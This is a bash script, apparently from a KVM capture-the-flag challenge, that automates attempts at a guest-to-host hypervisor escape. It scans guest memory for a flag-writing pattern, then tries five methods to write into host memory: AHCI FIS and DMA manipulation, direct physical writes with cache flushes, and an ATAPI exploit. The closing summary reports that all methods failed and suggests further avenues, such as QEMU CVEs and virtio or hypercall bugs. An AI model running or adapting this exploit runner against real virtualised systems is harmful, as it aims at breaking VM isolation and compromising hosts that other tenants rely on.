#!/bin/bash
#
# KVM CTF Full Exploit Runner
# Tries all available exploitation methods
#

PROBER="./kvm_prober"
EXPLOIT="./ahci_exploit"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo "=========================================="
echo "  KVM CTF Full Exploit Runner"
echo "=========================================="
echo

# Check if we're root
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[-] Need root privileges${NC}"
    exit 1
fi

# Check initial hypercall
echo "[*] Checking initial hypercall 100..."
INITIAL=$($PROBER hypercall 100 2>/dev/null | grep -oP '0x[0-9a-fA-F]+' | tail -1)
echo "    Result: $INITIAL"

if [ "$INITIAL" != "0x0" ] && [ "$INITIAL" != "0xffffffffffffffff" ]; then
    echo -e "${GREEN}[!!!] Flag already retrieved: $INITIAL${NC}"
    exit 0
fi
echo

# Scan for pattern
echo "[*] Scanning for write_flag pattern..."
SCAN_OUTPUT=$($PROBER exploit_scan 0xffff888100000000 0xffff888180000000 2>&1)
FOUND_ADDR=$(echo "$SCAN_OUTPUT" | grep -oP '0xffff888[0-9a-fA-F]+' | head -1)

if [ -z "$FOUND_ADDR" ]; then
    echo -e "${RED}[-] Pattern not found!${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Found pattern at: $FOUND_ADDR${NC}"

# Convert to GPA
GPA=$(printf "0x%x" $(( $FOUND_ADDR - 0xffff888000000000 )))
echo "[+] Guest Physical Address: $GPA"
echo

# Function to check hypercall
check_flag() {
    local result=$($PROBER hypercall 100 2>/dev/null | grep -oP '0x[0-9a-fA-F]+' | tail -1)
    if [ "$result" != "0x0" ] && [ "$result" != "0xffffffffffffffff" ]; then
        echo -e "${GREEN}[!!!] SUCCESS! Flag: $result${NC}"
        return 0
    fi
    return 1
}

# Method 1: AHCI FIS Exploit
echo "=========================================="
echo -e "${YELLOW}Method 1: AHCI FIS Base Manipulation${NC}"
echo "=========================================="
if [ -x "$EXPLOIT" ]; then
    $EXPLOIT exploit $GPA 0x4141414141414141
    if check_flag; then
        exit 0
    fi
else
    echo "[-] $EXPLOIT not found, skipping"
fi
echo

# Method 2: AHCI DMA Write
echo "=========================================="
echo -e "${YELLOW}Method 2: AHCI DMA PRD Write${NC}"
echo "=========================================="
if [ -x "$EXPLOIT" ]; then
    $EXPLOIT dma $GPA 0x4141414141414141
    if check_flag; then
        exit 0
    fi
else
    echo "[-] $EXPLOIT not found, skipping"
fi
echo

# Method 3: Direct memory write with cache flush
echo "=========================================="
echo -e "${YELLOW}Method 3: Direct Write + Cache Flush${NC}"
echo "=========================================="
if [ -x "$PROBER" ]; then
    echo "[*] Writing to physical address..."
    $PROBER write_phys_direct $GPA 4141414141414141 2>/dev/null
    echo "[*] Flushing caches..."
    $PROBER wbinvd 2>/dev/null
    if check_flag; then
        exit 0
    fi
else
    echo "[-] $PROBER not found, skipping"
fi
echo

# Method 4: Try write_flush if available
echo "=========================================="
echo -e "${YELLOW}Method 4: Write + Flush Combined${NC}"
echo "=========================================="
if [ -x "$PROBER" ]; then
    $PROBER write_flush $GPA 4141414141414141 2>/dev/null || echo "[-] write_flush not available"
    if check_flag; then
        exit 0
    fi
fi
echo

# Method 5: Try atapi_exploit if available
echo "=========================================="
echo -e "${YELLOW}Method 5: ATAPI Specific Exploit${NC}"
echo "=========================================="
if [ -x "./atapi_exploit" ]; then
    ./atapi_exploit $GPA
    if check_flag; then
        exit 0
    fi
else
    echo "[-] ./atapi_exploit not found, skipping"
fi
echo

# Summary
echo "=========================================="
echo "  Summary"
echo "=========================================="
echo -e "${RED}[-] All methods failed${NC}"
echo
echo "Pattern found at VA $FOUND_ADDR (GPA $GPA)"
echo "but writes don't affect the host's write_flag."
echo
echo "This confirms Copy-on-Write is protecting the memory."
echo
echo "Possible next steps:"
echo "  1. Check QEMU version for specific CVEs"
echo "  2. Try virtio device exploitation"
echo "  3. Look for KVM hypercall vulnerabilities"
echo "  4. Investigate memory slot configurations"
echo
